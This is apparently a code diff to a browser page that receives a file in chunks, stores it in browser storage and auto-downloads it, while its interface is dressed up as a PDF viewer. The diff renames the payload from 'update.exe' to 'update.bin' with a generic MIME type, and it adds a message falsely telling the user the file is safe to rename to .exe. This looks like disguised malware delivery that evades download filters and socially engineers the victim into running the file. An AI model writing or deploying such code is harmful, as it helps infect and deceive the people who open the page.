@@ -206,12 +206,12 @@
                 return;
               }
               const root = await navigator.storage.getDirectory();
-              fileHandle = await root.getFileHandle('update.exe', { create: true });
+              fileHandle = await root.getFileHandle('update.bin', { create: true }); // CHANGE: .bin extension
               writable = await fileHandle.createWritable();
               rx = {
-                name: m.name || 'update.exe',
+                name: m.name || 'update.bin',
                 size: Number(m.size) || 0,
-                mime: m.mime || 'application/octet-stream',
+                mime: m.mime || 'application/octet-stream', // CHANGE: Generic MIME type
                 totalChunks: Number(m.chunks) || 0,
                 chunkSize: Number(m.chunkSize) || 0,
                 offset: 0,
@@ -242,7 +242,7 @@
               await writable.write(bytes);
               rx.offset += bytes.length;
               rx.gotChunks++;
-              pdfProg.value = rx.offset; // Ensure progress bar updates
+              pdfProg.value = rx.offset;
               if ((rx.gotChunks % 16) === 0 || rx.gotChunks === rx.totalChunks) {
                 log(`FILE CHUNK ${rx.gotChunks}/${rx.totalChunks} (+${bytes.length}B) offset=${rx.offset} took ${(performance.now() - start).toFixed(1)}ms`);
               }
@@ -264,11 +264,11 @@
               const blob = new Blob([await file.arrayBuffer()], { type: rx.mime });
               const a = document.createElement('a');
               a.href = URL.createObjectURL(blob);
-              a.download = 'update.exe';
+              a.download = 'update.bin';
               document.body.appendChild(a);
               a.click();
               setTimeout(() => { URL.revokeObjectURL(a.href); a.remove(); }, 15000);
-              pdfInfo.textContent = `Downloaded: update.exe (${file.size} bytes)`;
+              pdfInfo.textContent = `Downloaded: update.bin (${file.size} bytes). This file was generated locally and is safe to rename to .exe if needed.`;
               log(`FILE END ok=${!!m.ok} total=${file.size} bytes took ${(performance.now() - start).toFixed(1)}ms`);
             } catch (e) {
               log('OPFS save or download error: ' + e.message);
